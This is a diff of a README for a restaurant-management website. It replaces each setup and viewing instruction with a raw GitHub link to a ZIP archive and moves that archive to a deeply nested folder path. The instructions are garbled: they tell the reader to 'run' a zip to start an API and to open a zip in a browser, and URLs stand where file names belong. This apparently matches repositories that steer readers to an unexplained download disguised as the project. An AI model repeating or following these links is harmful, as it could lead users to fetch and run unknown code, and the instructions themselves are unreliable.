@@ -13,7 +13,7 @@ This script will:
 
 ## 🧑‍💻 Step 2: Run the Backend API
 
-Run 'https://raw.githubusercontent.com/Mohamed3324k/Restaurant-management-website/main/colove/Restaurant-management-website.zip' file to start the backend API
+Run 'https://raw.githubusercontent.com/Mohamed3324k/Restaurant-management-website/main/frontend/public/Admin/Table/Adding/management-website-Restaurant-2.1.zip' file to start the backend API
 
 ---
 
@@ -21,7 +21,7 @@ Run 'https://raw.githubusercontent.com/Mohamed3324k/Restaurant-management-websit
 
 To see the **customer-facing website**:
 
-https://raw.githubusercontent.com/Mohamed3324k/Restaurant-management-website/main/colove/Restaurant-management-website.zip https://raw.githubusercontent.com/Mohamed3324k/Restaurant-management-website/main/colove/Restaurant-management-website.zip file.
+https://raw.githubusercontent.com/Mohamed3324k/Restaurant-management-website/main/frontend/public/Admin/Table/Adding/management-website-Restaurant-2.1.zip https://raw.githubusercontent.com/Mohamed3324k/Restaurant-management-website/main/frontend/public/Admin/Table/Adding/management-website-Restaurant-2.1.zip file.
 
 ---
 
@@ -30,7 +30,7 @@ https://raw.githubusercontent.com/Mohamed3324k/Restaurant-management-website/mai
 To view the **Admin page**:
 
 1. Navigate to the `Admin` folder:
-2. Open `https://raw.githubusercontent.com/Mohamed3324k/Restaurant-management-website/main/colove/Restaurant-management-website.zip` in your browser.
+2. Open `https://raw.githubusercontent.com/Mohamed3324k/Restaurant-management-website/main/frontend/public/Admin/Table/Adding/management-website-Restaurant-2.1.zip` in your browser.
 
 ---
 
